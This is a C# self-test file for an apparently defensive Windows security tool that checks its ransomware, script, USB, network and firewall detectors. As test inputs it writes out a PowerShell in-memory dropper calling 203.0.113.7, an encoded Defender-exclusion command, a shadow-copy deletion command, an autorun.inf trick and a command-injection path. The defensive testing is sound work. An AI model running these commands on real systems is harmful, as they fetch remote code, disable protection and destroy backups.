using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using MineHunter.Guards;
using MineHunter.Model;
using MineHunter.Native;
using MineHunter.Rules;
using MineHunter.Util;

namespace MineHunter
{
    public static partial class SelfTest
    {
        static GuardContext TestGuardCtx(RulePack rules, List<GuardAlert> alerts, string journalFile)
        {
            var g = new GuardContext { Settings = new Settings { NotifyLevel = "Info", GameMode = false, UsbAutoCheck = true }, Rules = rules, Allow = new Allowlist(), Journal = new SystemJournal { FileOverride = journalFile } };
            g.Raise = a => { lock (alerts) alerts.Add(a); };
            return g;
        }

        static Signal Sg(string actor, EvidenceCategory c, int w, string rule, bool def = false, DateTime? t = null) { return new Signal { Actor = actor, Category = c, Weight = w, Rule = rule, Text = rule, Definitive = def, Time = t ?? DateTime.Now }; }

        // ============================================================================================ guard logic that needs no files
        static void GuardLogicChecks(RulePack rules)
        {
            W.WriteLine("\nReal-time layer: correlation, scripts, ransomware logic, USB tricks, network view, journal");
            var c = new Correlator();
            var w1 = c.Add(Sg("a.exe", EvidenceCategory.Location, 8, "L")); var w2 = c.Add(Sg("a.exe", EvidenceCategory.Network, 12, "N"));
            Check("weak signals alone (a user folder, a new address) are nothing or at most a note, never a warning", w1 == null && (w2 == null || w2.Level == AlertLevel.Info));
            var a1 = c.Add(Sg("a.exe", EvidenceCategory.Persistence, 28, "P"));
            Check("independent kinds that agree (location + network + persistence) become a Suspicious notice", a1 != null && a1.Level == AlertLevel.Suspicious && a1.Categories >= 2, a1 == null ? "null" : a1.Level + " score " + a1.Score);
            Check("the same level is not repeated for the same program", c.Add(Sg("a.exe", EvidenceCategory.Persistence, 28, "P2")) == null);
            var a2 = c.Add(Sg("a.exe", EvidenceCategory.Content, 60, "C", true));
            Check("more evidence of a higher kind raises it to Dangerous", a2 != null && a2.Level == AlertLevel.Dangerous, a2 == null ? "null" : a2.Level.ToString());
            var c2 = new Correlator();
            Check("a decisive signal with enough weight is dangerous on its own; a single loud one is only suspicious", c2.Add(Sg("b.exe", EvidenceCategory.Tamper, 55, "T")).Level == AlertLevel.Suspicious && new Correlator().Add(Sg("c.exe", EvidenceCategory.Content, 60, "D", true)).Level == AlertLevel.Dangerous);
            var c3 = new Correlator { Window = TimeSpan.FromMinutes(1) };
            c3.Add(Sg("d.exe", EvidenceCategory.Persistence, 28, "P", false, DateTime.Now.AddMinutes(-10)));
            Check("signals older than the window are forgotten (a slow coincidence is not a story)", c3.Add(Sg("d.exe", EvidenceCategory.Network, 12, "N")) == null);
            Check("the story names the program, where it ran from and what it did", Correlator.Story(@"C:\Users\A\AppData\Local\Temp\x.exe", new[] { Sg("x", EvidenceCategory.Persistence, 28, "created an autostart task"), Sg("x", EvidenceCategory.Network, 12, "connected to a new address") }).Contains("x.exe") && Correlator.PlaceOf(@"C:\Users\A\AppData\Local\Temp\x.exe") != null);

            // scripts
            string drop = "$u='http://203.0.113.7/p.bin'; $d=(New-Object Net.WebClient).DownloadString($u); $b=[Convert]::FromBase64String($d); [Reflection.Assembly]::Load($b); powershell -w hidden -nop";
            string plain = "Invoke-WebRequest -Uri https://example.com/file.zip -OutFile $env:TEMP\\file.zip; Expand-Archive $env:TEMP\\file.zip -DestinationPath C:\\Tools";
            var sd = ScriptAnalyzer.Analyze(drop, "x.ps1", rules, false, "x");
            var sp = ScriptAnalyzer.Analyze(plain, "ok.ps1", rules, false, "y");
            Check("a script that downloads, decodes and loads code into memory is flagged; an ordinary download-and-unzip script is not", sd.Signals.Any(s => s.Rule.StartsWith("SCRIPT.")) && sd.Signals.Sum(s => s.Weight) >= 40 && sp.Signals.Count == 0, string.Join(",", sp.Signals.Select(s => s.Rule)));
            string enc = Convert.ToBase64String(Encoding.Unicode.GetBytes("Add-MpPreference -ExclusionPath 'C:\\ProgramData'"));
            var se = ScriptAnalyzer.Analyze("powershell.exe -NoP -W Hidden -enc " + enc, "a.bat", rules, false, "z");
            Check("a hidden -EncodedCommand is decoded and what is inside is judged too", se.Decoded != null && se.Decoded.Contains("Add-MpPreference") && se.Signals.Any(s => s.Category == EvidenceCategory.Tamper), se.Decoded);
            Check("a script that deletes shadow copies is recognised as ransomware preparation", ScriptAnalyzer.Analyze("vssadmin delete shadows /all /quiet", "b.bat", rules, false, "w").Signals.Any(s => s.Rule == "SCRIPT.DELETE_BACKUPS"));
            Check("script path in a command line is found only for real, small script files", ScriptAnalyzer.ScriptPathOf("cmd /c C:\\nope\\x.bat") == null && ScriptAnalyzer.ScriptPathOf("powershell -File " + System.Reflection.Assembly.GetExecutingAssembly().Location) == null);
            int am = Amsi.Scan("Write-Host hello", "t.ps1");
            Check("AMSI is available as a client and a harmless text is not reported (" + (am == -1 ? "not available here" : "answer " + am) + ")", am == 0 || am == -1);

            // ransomware logic
            var rd = new RansomDetector(); string root = @"C:\Users\T\Documents"; var now = DateTime.Now;
            for (int i = 0; i < 40; i++) { string d = root + @"\f" + (i % 4); rd.Event(d + @"\doc" + i + ".docx.locked", FileEventKind.Renamed, d + @"\doc" + i + ".docx", now); }
            for (int i = 0; i < 4; i++) rd.Event(root + @"\f" + i + @"\README_TO_DECRYPT.txt", FileEventKind.Created, null, now);
            var ra = rd.Evaluate(now);
            Check("mass renaming to one unknown extension plus ransom notes in several folders is flagged", ra.Level != null && ra.Level >= AlertLevel.Suspicious && ra.Score >= 90, ra.Level + " " + ra.Score);
            var rd2 = new RansomDetector(); rd2.AddCanary(root + @"\~canary.docx");
            rd2.Event(root + @"\~canary.docx", FileEventKind.Renamed, null, now);
            for (int i = 0; i < 15; i++) { string d = root + @"\g" + (i % 3); rd2.Event(d + @"\p" + i + ".pdf.enc", FileEventKind.Renamed, d + @"\p" + i + ".pdf", now); }
            var rb = rd2.Evaluate(now);
            Check("a touched decoy file together with mass renaming is dangerous", rb.CanaryHit && rb.Level == AlertLevel.Dangerous, rb.Level + " " + rb.Score);
            var rd3 = new RansomDetector();
            for (int i = 0; i < 150; i++) rd3.Event(root + @"\Photos\img" + i + ".jpg", FileEventKind.Modified, null, now);
            Check("a photo editor or archiver rewriting many files in ONE folder is not an alarm", rd3.Evaluate(now).Level == null);
            var rd4 = new RansomDetector();
            for (int i = 0; i < 120; i++) rd4.Event(root + @"\b" + (i % 6) + @"\file" + i + ".dat", FileEventKind.Modified, null, now);
            Check("a backup tool rewriting files in many folders, signed by a trusted publisher, is at most a note", rd4.Evaluate(now, true).Level == null || rd4.Evaluate(now, true).Level == AlertLevel.Info);
            var rd5 = new RansomDetector(); for (int i = 0; i < 20; i++) rd5.Event(root + @"\x" + (i % 3) + @"\a" + i + ".doc", FileEventKind.Renamed, root + @"\x" + (i % 3) + @"\a" + i + ".docx", now);
            Check("changing .docx to .doc (an ordinary extension) is not 'an unknown extension'", rd5.Evaluate(now).Level == null);
            var rd6 = new RansomDetector(); rd6.Event(root + @"\a.locked", FileEventKind.Renamed, root + @"\a.txt", now.AddMinutes(-5));
            Check("events older than the window are forgotten", rd6.Evaluate(now).Score == 0);

            // USB tricks
            string usb = NewTemp("mh_usb_");
            try
            {
                string hidden = Path.Combine(usb, "Photos"); Directory.CreateDirectory(hidden); File.SetAttributes(hidden, FileAttributes.Hidden);
                File.WriteAllText(Path.Combine(usb, "autorun.inf"), "[autorun]\r\nopen=Photos.exe\r\nshellexecute=Photos.exe");
                File.Copy(Path.Combine(PathUtil.System32, "notepad.exe"), Path.Combine(usb, "Photos.exe"));
                try { Type t = Type.GetTypeFromProgID("WScript.Shell"); dynamic sh = Activator.CreateInstance(t); dynamic l = sh.CreateShortcut(Path.Combine(usb, "Photos.lnk")); l.TargetPath = Path.Combine(PathUtil.System32, "cmd.exe"); l.Arguments = "/c start Photos.exe"; l.Save(); } catch { }
                var f = UsbScanner.Scan(usb);
                string kinds = string.Join(",", f.Select(x => x.Kind));
                Check("a drive with autorun.inf, a folder replaced by a shortcut and a program named like the folder is flagged on each trick", f.Any(x => x.Kind == "autorun") && f.Any(x => x.Kind == "exe-folder") && (f.Any(x => x.Kind == "lnk-folder") || !File.Exists(Path.Combine(usb, "Photos.lnk"))), kinds);
                string clean = NewTemp("mh_usb2_");
                try
                {
                    File.WriteAllText(Path.Combine(clean, "report.docx"), "x"); File.WriteAllText(Path.Combine(clean, "notes.txt"), "x"); Directory.CreateDirectory(Path.Combine(clean, "Music")); File.Copy(Path.Combine(PathUtil.System32, "notepad.exe"), Path.Combine(clean, "setup.exe"));
                    Check("an ordinary drive (documents, music, an installer) gives nothing", UsbScanner.Scan(clean).Count == 0);
                }
                finally { try { Directory.Delete(clean, true); } catch { } }
                var alerts = new List<GuardAlert>(); var g = TestGuardCtx(rules, alerts, Path.Combine(RulePack.DataDir, "j-usb.json"));
                var ug = new UsbGuard(); ug.Start(g);
                var al = ug.Inspect(usb);
                ug.Stop();
                Check("the USB guard turns the findings into an alert that says what was found on which drive", al != null && al.Level >= AlertLevel.Suspicious && al.Text.Contains(usb) && g.Journal.List().Count >= 1, al == null ? "no alert" : al.Level + " " + al.Text);
            }
            finally { try { File.SetAttributes(Path.Combine(usb, "Photos"), FileAttributes.Normal); } catch { } try { Directory.Delete(usb, true); } catch { } }

            // network view and firewall command builder
            Check("private and public addresses are told apart", NetworkView.IsPrivate("192.168.1.5") && NetworkView.IsPrivate("10.1.2.3") && NetworkView.IsPrivate("127.0.0.1") && NetworkView.IsPrivate("172.20.0.1") && !NetworkView.IsPrivate("8.8.8.8") && !NetworkView.IsPrivate("203.0.113.7"));
            var live = NetworkView.Snapshot(rules);
            Check("the live connection list is read (" + live.Count + " connections) with a program behind most of them", live.Count > 0 && live.Count(x => !string.IsNullOrEmpty(x.Process)) >= live.Count / 2);
            var cmds = FirewallBlock.BuildBlockCommands(@"C:\Users\A\AppData\Roaming\x\bad.exe");
            Check("blocking a program builds two Windows Firewall rules (out and in) for exactly that program", cmds != null && cmds.Count == 2 && cmds[0].Contains("dir=out action=block program=\"C:\\Users\\A\\AppData\\Roaming\\x\\bad.exe\"") && cmds[1].Contains("dir=in"));
            Check("a path with quotes, pipes or a relative path never becomes a command", FirewallBlock.BuildBlockCommands("a.exe") == null && FirewallBlock.BuildBlockCommands("C:\\x\" & calc & \"y.exe") == null && FirewallBlock.BuildBlockCommands("C:\\x|y.exe") == null && FirewallBlock.BuildBlockCommands("") == null);
            Check("unblocking removes the rules by their own name only", FirewallBlock.BuildUnblockCommand(@"C:\x\bad.exe") == "advfirewall firewall delete rule name=\"MineHunter block - bad.exe\"");
            {
                var alerts = new List<GuardAlert>(); var g = TestGuardCtx(rules, alerts, Path.Combine(RulePack.DataDir, "j-net.json")); var ng = new NetworkGuard(); ng.Start(g);
                string path = @"C:\Users\A\AppData\Roaming\x\bad.exe", path2 = @"C:\Users\A\AppData\Roaming\y\worse.exe";
                Func<string, string, int, bool, ConnectionInfo> conn = (pth, ip, port, trusted) => new ConnectionInfo { Pid = 4242, Process = "bad", Path = pth, Remote = ip, RemotePort = port, State = "Established", External = true, Trusted = trusted, UserWritable = true };
                ng.Evaluate(new List<ConnectionInfo> { conn(path, "203.0.113.7", 443, false) });
                Check("one new connection from an unknown program is no alert on its own", alerts.Count == 0);
                g.Correlator.Add(Sg(PathUtil.Normalize(path2), EvidenceCategory.Content, 40, "MINER.STRINGS"));
                ng.Evaluate(new List<ConnectionInfo> { conn(path2, "203.0.113.8", rules.MiningPorts.FirstOrDefault(), false) });
                Check("... but together with miner markers in the same program and a mining port it becomes one", alerts.Count == 1 && alerts[0].Level >= AlertLevel.Suspicious && alerts[0].Text.Contains("worse.exe"), alerts.Count == 0 ? "no alert" : alerts[0].Level + " " + alerts[0].Text);
                ng.Evaluate(new List<ConnectionInfo> { conn(path2, "203.0.113.9", 3333, true) });
                Check("a trusted program's connections are never reported", alerts.Count == 1);
                ng.Stop();
            }

            // the journal
            var j = new SystemJournal { FileOverride = Path.Combine(RulePack.DataDir, "j-test.json") };
            j.Add("tasks", "SomeSetup.exe created a task", @"C:\x\SomeSetup.exe", "SomeSetup.exe"); j.Add("services", "Installed a service XYZ");
            var jl = j.List();
            Check("the journal of system changes records what changed, when and by whom, newest first", jl.Count == 2 && jl[0].Kind == "services" && jl[1].Actor == "SomeSetup.exe" && (DateTime.Now - jl[0].Time).TotalMinutes < 1);
        }
    }
}
